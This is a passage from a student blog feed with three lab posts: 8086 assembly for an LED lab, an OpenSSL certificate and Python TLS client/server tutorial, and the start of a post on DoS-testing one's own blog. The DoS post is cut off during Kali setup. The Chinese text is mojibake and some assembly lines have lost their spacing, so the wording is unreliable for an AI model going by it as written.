class="line">PB_ADD EQU 0271H </span><br><span class="line">PC_ADD EQU 0272H </span><br><span class="line">_STACK SEGMENT STACK </span><br><span class="line"> DW 100 DUP(?) </span><br><span class="line">_STACK ENDS </span><br><span class="line">_DATA SEGMENT WORD PUBLIC &#x27;DATA&#x27; </span><br><span class="line">_DATA ENDS </span><br><span class="line">CODE SEGMENT </span><br><span class="line">START PROC NEAR </span><br><span class="line">ASSUME CS:CODE, DS:_DATA, SS:_STACK </span><br><span class="line">MOV AX,_DATA  ; å°†æ•°æ®æ®µåœ°å€åŠ è½½åˆ°AXå¯„å­˜å™¨</span><br><span class="line">MOV DS,AX ; å°†æ•°æ®æ®µåœ°å€ä¼ é€ç»™æ•°æ®æ®µå¯„å­˜å™¨DS</span><br><span class="line">NOP </span><br><span class="line">MOV DX,COM_ADD ; å°†ä¸²å£åœ°å€ä¼ é€ç»™DXå¯„å­˜å™¨</span><br><span class="line">MOV AL,82H ; è®¾ç½®ALå¯„å­˜å™¨çš„å€¼ä¸º82H</span><br><span class="line">OUT DX,AL </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">INPUT:</span><br><span class="line"> ; æ¸…é›¶æ“ä½œ</span><br><span class="line">MOV     AX, 0FFFFH </span><br><span class="line">MOVDX, PA_ADD</span><br><span class="line">OUT     DX, AX</span><br><span class="line">MOVDX, PC_ADD</span><br><span class="line">OUT     DX, AX</span><br><span class="line">; è¾“å…¥æ“ä½œ</span><br><span class="line">MOVDX, PB_ADD</span><br><span class="line">INal, DX</span><br><span class="line">mov    ah, 0</span><br><span class="line">; åˆ¤æ–­</span><br><span class="line">        CMPal, 0D0H </span><br><span class="line">JZ mid</span><br><span class="line">        cmp al, 0FH </span><br><span class="line">        JZ lar1 </span><br><span class="line">        cmp al, 0F0H </span><br><span class="line">        JZ ral1</span><br><span class="line">CMPal, 0FFH ;å…¨1,</span><br><span class="line">JZ low1</span><br><span class="line">CMPal, 0 ;å…¨0</span><br><span class="line">JZ high1</span><br><span class="line">MOVDX, PA_ADD</span><br><span class="line">OUTDX, al</span><br><span class="line">JMPINPUT</span><br><span class="line">; å¤„ç†è¾“å…¥å€¼ä¸º0-7çš„æƒ…å†µ</span><br><span class="line">mid:</span><br><span class="line">shl al,4</span><br><span class="line">        shr al,4</span><br><span class="line">        shr ah,4</span><br><span class="line">        add al,ah</span><br><span class="line">        mov ah,0</span><br><span class="line">        mov dx, PA_ADD ;00001101</span><br><span class="line">        out dx,ax</span><br><span class="line">        jmp INPUT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; å¤„ç†è¾“å…¥å€¼ä¸º0-7çš„æƒ…å†µ</span><br><span class="line">ral1:</span><br><span class="line">MOVal, 7FH ; è®¾ç½®ALå¯„å­˜å™¨çš„å€¼ä¸º7FH</span><br><span class="line">MOVDX, PA_ADD ; å°†å¹¶å£PAåœ°å€ä¼ é€ç»™DXå¯„å­˜å™¨</span><br><span class="line">ral2:</span><br><span class="line">RORal, 1 ; å°†ALå¯„å­˜å™¨çš„å€¼å·¦å¾ªç¯ç§»ä½1ä½</span><br><span class="line">OUTDX, al</span><br><span class="line">CALL    Delay</span><br><span class="line">CMPal, 7FH</span><br><span class="line">JNElow2</span><br><span class="line">MOV    AX, 0FFFFH ; å°†AXå¯„å­˜å™¨çš„å€¼è®¾ä¸º0xFFFF</span><br><span class="line">OUT     DX, AX</span><br><span class="line">; å¤„ç†è¾“å…¥å€¼ä¸º8-15çš„æƒ…å†µ</span><br><span class="line">ral3:</span><br><span class="line">MOVal, 7FH</span><br><span class="line">MOVDX, PC_ADD</span><br><span class="line">ral4:</span><br><span class="line">ROLal, 1</span><br><span class="line">OUTDX, al</span><br><span class="line">CALL    Delay</span><br><span class="line">CMPal, 7FH</span><br><span class="line">JNElow4</span><br><span class="line">JMPINPUT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; å¤„ç†è¾“å…¥å€¼ä¸º0-7çš„æƒ…å†µ</span><br><span class="line">lar1:</span><br><span class="line">MOVal, 7FH ; è®¾ç½®ALå¯„å­˜å™¨çš„å€¼ä¸º7FH</span><br><span class="line">MOVDX, PA_ADD ; å°†å¹¶å£PAåœ°å€ä¼ é€ç»™DXå¯„å­˜å™¨</span><br><span class="line">lar2:</span><br><span class="line">ROLal, 1 ; å°†ALå¯„å­˜å™¨çš„å€¼å·¦å¾ªç¯ç§»ä½1ä½</span><br><span class="line">OUTDX, al</span><br><span class="line">CALL    Delay</span><br><span class="line">CMPal, 7FH</span><br><span class="line">JNElow2</span><br><span class="line">MOV    AX, 0FFFFH ; å°†AXå¯„å­˜å™¨çš„å€¼è®¾ä¸º0xFFFF</span><br><span class="line">OUT     DX, AX</span><br><span class="line">; å¤„ç†è¾“å…¥å€¼ä¸º8-15çš„æƒ…å†µ</span><br><span class="line">lar3:</span><br><span class="line">MOVal, 7FH</span><br><span class="line">MOVDX, PC_ADD</span><br><span class="line">lar4:</span><br><span class="line">RORal, 1</span><br><span class="line">OUTDX, al</span><br><span class="line">CALL    Delay</span><br><span class="line">CMPal, 7FH</span><br><span class="line">JNElow4</span><br><span class="line">JMPINPUT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; å¤„ç†è¾“å…¥å€¼ä¸º0-7çš„æƒ…å†µ</span><br><span class="line">low1:</span><br><span class="line">MOVal, 7FH ; è®¾ç½®ALå¯„å­˜å™¨çš„å€¼ä¸º7FH</span><br><span class="line">MOVDX, PA_ADD ; å°†å¹¶å£PAåœ°å€ä¼ é€ç»™DXå¯„å­˜å™¨</span><br><span class="line">low2:</span><br><span class="line">ROLal, 1 ; å°†ALå¯„å­˜å™¨çš„å€¼å·¦å¾ªç¯ç§»ä½1ä½</span><br><span class="line">OUTDX, al</span><br><span class="line">CALL    Delay</span><br><span class="line">CMPal, 7FH</span><br><span class="line">JNElow2</span><br><span class="line">MOV    AX, 0FFFFH ; å°†AXå¯„å­˜å™¨çš„å€¼è®¾ä¸º0xFFFF</span><br><span class="line">OUT     DX, AX</span><br><span class="line">; å¤„ç†è¾“å…¥å€¼ä¸º8-15çš„æƒ…å†µ</span><br><span class="line">low3:</span><br><span class="line">MOVal, 7FH</span><br><span class="line">MOVDX, PC_ADD</span><br><span class="line">low4:</span><br><span class="line">ROLal, 1</span><br><span class="line">OUTDX, al</span><br><span class="line">CALL    Delay</span><br><span class="line">CMPal, 7FH</span><br><span class="line">JNElow4</span><br><span class="line">JMPINPUT</span><br><span class="line"></span><br><span class="line">; å¤„ç†è¾“å…¥å€¼ä¸º15-8çš„æƒ…å†µ</span><br><span class="line">high1:</span><br><span class="line">MOVal, 0FEH</span><br><span class="line">MOVDX, PC_ADD</span><br><span class="line">high2:</span><br><span class="line">RORal, 1</span><br><span class="line">OUTDX, al</span><br><span class="line">CALL    Delay</span><br><span class="line">CMPal, 0FEH</span><br><span class="line">JNEhigh2</span><br><span class="line">MOV    AX, 0FFFFH</span><br><span class="line">OUT     DX, AX</span><br><span class="line">; å¤„ç†è¾“å…¥å€¼ä¸º7-0çš„æƒ…å†µ</span><br><span class="line">high3:</span><br><span class="line">MOVal, 0FEH</span><br><span class="line">MOVDX, PA_ADD</span><br><span class="line">high4:</span><br><span class="line">RORal, 1</span><br><span class="line">OUTDX, al</span><br><span class="line">CALL    Delay</span><br><span class="line">CMPal, 0FEH</span><br><span class="line">JNEhigh4</span><br><span class="line">JMPINPUT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Delay PROC NEAR</span><br><span class="line">Delay1:</span><br><span class="line">XORCX,CX</span><br><span class="line">LOOP$</span><br><span class="line">RET</span><br><span class="line">DelayENDP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">START ENDP </span><br><span class="line">CODE ENDS </span><br><span class="line">END START</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> xdu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenSSLå®ç°å•å‘è®¤è¯</title>
      <link href="/2023/12/14/Openssl/"/>
      <url>/2023/12/14/Openssl/</url>
      
        <content type="html"><![CDATA[<h2 id="OpenSSLå®ç°å•å‘è®¤è¯"><a href="#OpenSSLå®ç°å•å‘è®¤è¯" class="headerlink" title="OpenSSLå®ç°å•å‘è®¤è¯"></a>OpenSSLå®ç°å•å‘è®¤è¯</h2><h3 id="OpenSSLçš„å®‰è£…"><a href="#OpenSSLçš„å®‰è£…" class="headerlink" title="OpenSSLçš„å®‰è£…"></a>OpenSSLçš„å®‰è£…</h3><p>OpenSSLé‡‡ç”¨Cè¯­è¨€ä½œä¸ºå¼€å‘è¯­è¨€ï¼Œè¿™ä½¿å¾—å®ƒå…·æœ‰ä¼˜ç§€çš„è·¨å¹³å°æ€§èƒ½ï¼ŒOpenSSLæ”¯æŒï¼š</p><ul><li>Linux</li><li>Windows</li><li>Mac<br>ç­‰å¸¸è§æ“ä½œç³»ç»Ÿ<br><a href="https://github.com/openssl/openssl" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">OpenSSL githubåœ°å€</a></li></ul><p>winå’Œmacéœ€è¦å•ç‹¬å»ä¸‹OpenSSLå®¢æˆ·ç«¯,ç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤šæ•™ç¨‹,å¯ä»¥è‡ªå·±å»æ‰¾æ‰¾çœ‹</p><p>Linuxç³»ç»Ÿè‡ªå¸¦OpenSSLåº“,ä¸€èˆ¬ä¸éœ€è¦ä¸‹è½½å®‰è£…,æˆ‘ä¼šä½¿ç”¨<strong>KALI Linux</strong>è¿›è¡Œæœ¬æ¬¡å®éªŒ</p><p>æŸ¥çœ‹ä¸‹opensslçš„ç‰ˆæœ¬:<br><img src="https://pb01.s3.bitiful.net/81.png" alt="avatar"></p><h3 id="ç®€å•é€šä¿¡è¿‡ç¨‹"><a href="#ç®€å•é€šä¿¡è¿‡ç¨‹" class="headerlink" title="ç®€å•é€šä¿¡è¿‡ç¨‹"></a>ç®€å•é€šä¿¡è¿‡ç¨‹</h3><p>ä¸‹é¢ä»¥æœ€å¸¸è§çš„å•å‘è®¤è¯ä¸ºä¾‹ï¼Œç®€è¿°ä¸€ä¸‹é€šä¿¡è¿‡ç¨‹ï¼š</p><ol><li><p>å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€è¯·æ±‚</p></li><li><p>æœåŠ¡å™¨å°†åŒ…å«å…¬é’¥çš„è¯ä¹¦é€šè¿‡æ˜æ–‡å‘é€ç»™å®¢æˆ·ç«¯</p></li><li><p>å®¢æˆ·ç«¯é€šè¿‡æ ¹è¯ä¹¦éªŒè¯æœåŠ¡å™¨è¯ä¹¦æ˜¯å¦æœ‰æ•ˆ</p></li><li><p>å¦‚æœæœ‰æ•ˆï¼Œå®¢æˆ·ç«¯ç”Ÿæˆä¸€ä¸ªéšæœºå¯†é’¥ï¼Œä¹Ÿå«å¯¹ç§°åŠ å¯†å¯†é’¥ï¼Œä½¿ç”¨æœåŠ¡å™¨çš„å…¬é’¥è¿›è¡ŒåŠ å¯†ä¼ è¾“</p></li><li><p>æœåŠ¡å™¨é€šè¿‡ç§é’¥è§£å¯†å®¢æˆ·ç«¯ä¼ è¾“çš„å¯¹ç§°åŠ å¯†å¯†é’¥</p></li><li><p>è¿™æ—¶åªæœ‰æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯çŸ¥é“è¿™ä¸ªå¯¹ç§°åŠ å¯†å¯†é’¥ï¼ŒåŒæ–¹å¯ä»¥è¿›è¡Œå¯¹ç§°åŠ å¯†ä¼ è¾“</p></li></ol><p><img src="https://pb01.s3.bitiful.net/82.png" alt="avatar"></p><h3 id="é¢å‘è¯ä¹¦"><a href="#é¢å‘è¯ä¹¦" class="headerlink" title="é¢å‘è¯ä¹¦"></a>é¢å‘è¯ä¹¦</h3><p>é€šè¿‡vim /usr/lib/ssl/openssl.cnfä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œè¿™é‡Œä¿®æ”¹äº†é»˜è®¤æ–‡ä»¶å¤¹ã€ç§é’¥åã€è¯ä¹¦åã€‚<br><img src="https://pb01.s3.bitiful.net/83.png" alt="avatar"><br><img src="https://pb01.s3.bitiful.net/84.png" alt="avatar"></p><p><strong>åœ¨é»˜è®¤æ–‡ä»¶å¤¹åˆ›å»ºæ‰€éœ€çš„ç›®å½•å’Œæ–‡ä»¶</strong><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir -pv ssl</span><br><span class="line">cd ssl</span><br><span class="line">mkdir -pv &#123;certs,csr,newcerts,private&#125;</span><br><span class="line">touch &#123;serial,index.txt,index.txt.attr&#125;</span><br></pre></td></tr></table></figure><br><img src="https://pb01.s3.bitiful.net/85.png" alt="avatar"></p><p><strong>æŒ‡æ˜è¯ä¹¦å¼€å§‹çš„ç¼–å·</strong><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 01 &gt;&gt; serial</span><br></pre></td></tr></table></figure></p><p><strong>ç”Ÿæˆæ ¹è¯ä¹¦ç§é’¥</strong><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out private/ca.key 2048</span><br></pre></td></tr></table></figure></p><ul><li><p>genrsa: äº§ç”Ÿrsaå¯†é’¥å‘½ä»¤</p></li><li><p>-out: è¾“å‡ºè·¯å¾„</p></li></ul><p>è¿™é‡Œçš„å‚æ•°2048ï¼ŒæŒ‡çš„æ˜¯å¯†é’¥çš„é•¿åº¦ä½æ•°ï¼Œé»˜è®¤é•¿åº¦ä¸º512ä½ï¼Œå¯†é’¥è¶Šé•¿ï¼Œå®‰å…¨æ€§è¶Šé«˜ï¼Œä½†æ˜¯ç”Ÿæˆé€Ÿåº¦ä¹Ÿè¶Šæ…¢ã€‚</p><p><strong>ç”Ÿæˆè‡ªç­¾åè¯ä¹¦</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -x509 -key private/ca.key -out ca.crt -days 365</span><br></pre></td></tr></table></figure><ul><li><p>-newï¼šè¡¨ç¤ºç”Ÿæˆä¸€ä¸ªæ–°è¯ä¹¦ç­¾ç½²è¯·æ±‚</p></li><li><p>-x509ï¼šä¸“ç”¨äºCAç”Ÿæˆè‡ªç­¾è¯ä¹¦ï¼Œå¦‚æœä¸æ˜¯è‡ªç­¾è¯ä¹¦åˆ™ä¸éœ€è¦æ­¤é¡¹</p></li><li><p>-keyï¼šç”¨åˆ°çš„ç§é’¥æ–‡ä»¶</p></li><li><p>-outï¼šè¯ä¹¦çš„ä¿å­˜è·¯å¾„</p></li><li><p>-daysï¼šè¯ä¹¦çš„æœ‰æ•ˆæœŸé™ï¼Œå•ä½æ˜¯dayï¼ˆå¤©ï¼‰ï¼Œé»˜è®¤æ˜¯openssl.cnfçš„default_days</p></li></ul><p><img src="https://pb01.s3.bitiful.net/86.png" alt="avatar"></p><p><strong>ç”ŸæˆæœåŠ¡å™¨å¯†é’¥</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out private/server.key 2048</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆè¯·æ±‚æ–‡ä»¶,å›¾ä¸­åˆ’çº¿çš„è¿™å‡ é¡¹éœ€å’Œæ ¹è¯ä¹¦ä¸€è‡´ï¼Œåå‡ é¡¹æœ€å¥½ä¹Ÿä¿æŒä¸€è‡´ã€‚<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -key private/server.key -out csr/server.csr</span><br></pre></td></tr></table></figure></p><p><img src="https://pb01.s3.bitiful.net/87.png" alt="avatar"></p><p><strong>é¢å‘è¯ä¹¦</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl ca -in csr/server.csr -out certs/server.crt</span><br></pre></td></tr></table></figure><p><img src="https://pb01.s3.bitiful.net/88.png" alt="avatar"></p><h3 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h3><p>ä¸‹é¢é€šè¿‡ä¸€ä¸ªä¾‹ç¨‹æ¥æ¨¡æ‹Ÿå•å‘SSLè®¤è¯ï¼ŒæœåŠ¡å™¨éœ€è¦å‡†å¤‡å¥½åˆšåˆšç­¾å‘çš„æœåŠ¡å™¨è¯ä¹¦ï¼Œå’Œä¸€å®šè¦å¥½å¥½ä¿ç®¡çš„å¯†é’¥ï¼Œå®¢æˆ·ç«¯åªéœ€å‡†å¤‡å¥½æ ¹è¯ä¹¦å°±è¡Œï¼Œç”¨æ¥éªŒè¯æœåŠ¡å™¨çš„è¯ä¹¦ã€‚</p><p><strong>æœåŠ¡ç«¯ä»£ç </strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">server_ssl</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">build_listen</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># ç”ŸæˆSSLä¸Šä¸‹æ–‡</span></span><br><span class="line">        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)</span><br><span class="line">        <span class="comment"># åŠ è½½æœåŠ¡å™¨æ‰€ç”¨è¯ä¹¦å’Œç§é’¥</span></span><br><span class="line">        context.load_cert_chain(<span class="string">&#x27;server.crt&#x27;</span>, <span class="string">&#x27;server.key&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ç›‘å¬ç«¯å£</span></span><br><span class="line">        <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM, <span class="number">0</span>) <span class="keyword">as</span> sock:</span><br><span class="line">            sock.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8888</span>))</span><br><span class="line">            sock.listen(<span class="number">5</span>)</span><br><span class="line">            <span class="comment"># å°†socketæ‰“åŒ…æˆSSL socket</span></span><br><span class="line">            <span class="keyword">with</span> context.wrap_socket(sock, server_side=<span class="literal">True</span>) <span class="keyword">as</span> ssock:</span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                    <span class="comment"># æ¥æ”¶å®¢æˆ·ç«¯è¿æ¥</span></span><br><span class="line">                    client_socket, addr = ssock.accept()</span><br><span class="line">                    <span class="comment"># æ¥æ”¶å®¢æˆ·ç«¯ä¿¡æ¯</span></span><br><span class="line">                    msg = client_socket.recv(<span class="number">1024</span>).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;receive msg from client &#123;&#125;ï¼š&#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr, msg))</span><br><span class="line">                    <span class="comment"># å‘å®¢æˆ·ç«¯å‘é€ä¿¡æ¯</span></span><br><span class="line">                    msg = <span class="string">&quot;yes , you have client_socketect with server.\r\n&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">                    client_socket.send(msg)</span><br><span class="line">                    client_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    server = server_ssl()</span><br><span class="line">    server.build_listen()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>å®¢æˆ·ç«¯ä»£ç </strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">client_ssl</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send_hello</span>(<span class="params">self,</span>):</span><br><span class="line">        <span class="comment"># ç”ŸæˆSSLä¸Šä¸‹æ–‡</span></span><br><span class="line">        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)</span><br><span class="line">        <span class="comment"># åŠ è½½ä¿¡ä»»æ ¹è¯ä¹¦</span></span><br><span class="line">        context.load_verify_locations(<span class="string">&#x27;ca.crt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ä¸æœåŠ¡ç«¯å»ºç«‹socketè¿æ¥</span></span><br><span class="line">        <span class="keyword">with</span> socket.create_connection((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8888</span>)) <span class="keyword">as</span> sock:</span><br><span class="line">            <span class="comment"># å°†socketæ‰“åŒ…æˆSSL socket</span></span><br><span class="line">            <span class="comment"># ä¸€å®šè¦æ³¨æ„çš„æ˜¯è¿™é‡Œçš„server_hostnameä¸æ˜¯æŒ‡æœåŠ¡ç«¯IPï¼Œè€Œæ˜¯æŒ‡æœåŠ¡ç«¯è¯ä¹¦ä¸­çš„CNã€‚</span></span><br><span class="line">            <span class="keyword">with</span> context.wrap_socket(sock, server_hostname=<span class="string">&#x27;USER1&#x27;</span>) <span class="keyword">as</span> ssock:</span><br><span class="line">                <span class="comment"># å‘æœåŠ¡ç«¯å‘é€ä¿¡æ¯</span></span><br><span class="line">                msg = <span class="string">&quot;do i connect with server ?&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">                ssock.send(msg)</span><br><span class="line">                <span class="comment"># æ¥æ”¶æœåŠ¡ç«¯è¿”å›çš„ä¿¡æ¯</span></span><br><span class="line">                msg = ssock.recv(<span class="number">1024</span>).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;receive msg from server : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(msg))</span><br><span class="line">                ssock.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    client = client_ssl()</span><br><span class="line">    client.send_hello()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>ç»“æœ</strong></p><p>æœåŠ¡ç«¯<br><img src="https://pb01.s3.bitiful.net/89.png" alt="avatar"></p><p>å®¢æˆ·ç«¯<br><img src="https://pb01.s3.bitiful.net/90.png" alt="avatar"></p>]]></content>
      
      
      <categories>
          
          <category> xdu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨ </tag>
            
            <tag> lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯¹è‡ªå·±çš„åšå®¢ç½‘ç«™è¿›è¡ŒDOSæ”»å‡»</title>
      <link href="/2023/12/13/DOS%E6%94%BB%E5%87%BB/"/>
      <url>/2023/12/13/DOS%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h3 id="å¯¹è‡ªå·±çš„åšå®¢ç½‘ç«™è¿›è¡ŒDOSæ”»å‡»"><a href="#å¯¹è‡ªå·±çš„åšå®¢ç½‘ç«™è¿›è¡ŒDOSæ”»å‡»" class="headerlink" title="å¯¹è‡ªå·±çš„åšå®¢ç½‘ç«™è¿›è¡ŒDOSæ”»å‡»"></a>å¯¹è‡ªå·±çš„åšå®¢ç½‘ç«™è¿›è¡ŒDOSæ”»å‡»</h3><p>å…ˆè¯´æ˜ä¸€ç‚¹,åˆ«å¯¹åˆ«äººçš„ç½‘ç«™è¿›è¡Œddos/dosæ”»å‡»(dosæ”»å‡»ä¸€èˆ¬çŸ­æ—¶é—´æ”»å‡»ä¸ä¸‹æ¥),è¿™æ˜¯è¿æ³•çš„,å¾ˆå¤šéƒ½æœ‰è‡ªåŠ¨æŠ¥è­¦æœºåˆ¶,<strong>æœ¬ç¯‡åšå®¢ä»…ç”¨äºå­¦ä¹ ,è¯·å‹¿ç”¨äºéæ³•ç”¨é€”</strong></p><h4 id="å®‰è£…kaili-Linux"><a href="#å®‰è£…kaili-Linux" class="headerlink" title="å®‰è£…kaili Linux"></a>å®‰è£…kaili Linux</h4><p>è¿›å…¥<a href="https://www.kali.org/get-kali/#kali-platforms" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">KALIå®˜ç½‘</a>,ä¸‹è½½isoé•œåƒæ–‡ä»¶</p><p><img src="https://pb01.s3.bitiful.net/57.png" alt="avatar"></p><p>vmwareæ–°å»ºè™šæ‹Ÿæœº,é€‰æ‹©è‡ªå®šä¹‰<br><img src="https://pb01.s3.bitiful.net/58.png" alt="avatar"></p><p>ç‚¹å‡»ä¸‹ä¸€æ­¥</p><p><img src="https://pb01.s3.bitiful.net/59.png" alt="avatar"></p><p>ç‚¹å‡»ä¸‹ä¸€æ­¥<br><img src="https://pb01.s3.bitiful.net/60.png" alt="avatar"><br>é€‰æ‹©ç¨åå®‰è£…æ“ä½œç³»ç»Ÿ,ç‚¹å‡»ä¸‹ä¸€æ­¥<br><img src="https://pb01.s3.bitiful.net/61.png" alt="avatar"><br>é€‰æ‹©Debianç³»ç»Ÿ,ç‰ˆæœ¬æ ¹æ®è‡ªå·±çš„kaliç‰ˆæœ¬æ¥,æˆ‘è¿™é‡Œå°±é€‰æœ€æ–°çš„Debian12,ç‚¹å‡»ä¸‹ä¸€æ­¥<br><img src="https://pb01.s3.bitiful.net/62.png" alt="avatar"><br>è™šæ‹Ÿæœºåç§°å’Œå­˜å‚¨ä½ç½®æ ¹æ®è‡ªå·±æƒ…å†µæ¥,ç‚¹å‡»ä¸‹ä¸€æ­¥<br><img src="https://pb01.s3.bitiful.net/63.png" alt="avatar"><br>å¤„ç†å™¨é…ç½®æ ¹æ®è‡ªå·±ç”µè„‘çš„é…ç½®æ¥,ç‚¹å‡»ä¸‹ä¸€æ­¥<br><img src="https://pb01.s3.bitiful.net/64.png" alt="avatar"><br>å†…å­˜ä¹Ÿæ˜¯æ ¹æ®è‡ªå·±çš„ä½¿ç”¨æƒ…å†µæ¥,ç‚¹å‡»ä¸‹ä¸€æ­¥<br><img src="https://pb01.s3.bitiful.net/65.png" alt="avatar"><br>ç‚¹å‡»ä¸‹ä¸€æ­¥<br><img src="https://pb01.s3.bitiful.net/66.png" alt="avatar"><br>ç‚¹å‡»ä¸‹ä¸€æ­¥<br><img src="https://pb01.s3.bitiful.net/67.png" alt="avatar"><br>ç‚¹å‡»ä¸‹ä¸€æ­¥<br><img src="https://pb01.s3.bitiful.net/68.png" alt="avatar"><br>ç‚¹å‡»ä¸‹ä¸€æ­¥<br><img src="https://pb01.s3.bitiful.net/69.png" alt="avatar"><br>ç‚¹å‡»ä¸‹ä¸€æ­¥<br><img src="https://pb01.s3.bitiful.net/70.png" alt="avatar"><br>ç‚¹å‡»ä¸‹ä¸€æ­¥<br><img src="https://pb01.s3.bitiful.net/71.png" alt="avatar"><br>ç‚¹å‡»è‡ªå®šä¹‰ç¡¬ä»¶<br><img src="https://pb01.s3.bitiful.net/72.png" alt="avatar"><br>å¯¼å…¥ä¸‹è½½å¥½çš„ISOæ–‡ä»¶,å…³é—­åç‚¹å‡»å®Œæˆå³å¯</p><p>å‰©ä¸‹å¯åŠ¨åçš„é…ç½®å°±æ¯”è¾ƒç®€å•äº†,æ ¹æ®è‡ªå·±æƒ…å†µæ¥å³å¯</p><p>å®‰è£…å®Œæˆåæ‰“å¼€æ˜¯è¿™æ ·çš„:<br><img src="https://pb01.s3.bitiful.net/73.png" alt="avatar"></p><h4 id="æ¢æº-æ›´æ–°"><a href="#æ¢æº-æ›´æ–°" class="headerlink" title="æ¢æº+æ›´æ–°"></a>æ¢æº+æ›´æ–°</h4><p><img src="https://pb01.s3.bitiful.net/74.png" alt="avatar"></p><p>è¿›å…¥rootæƒé™<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure></p><p>è¾“å…¥å¯†ç å,æ¢æº<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim 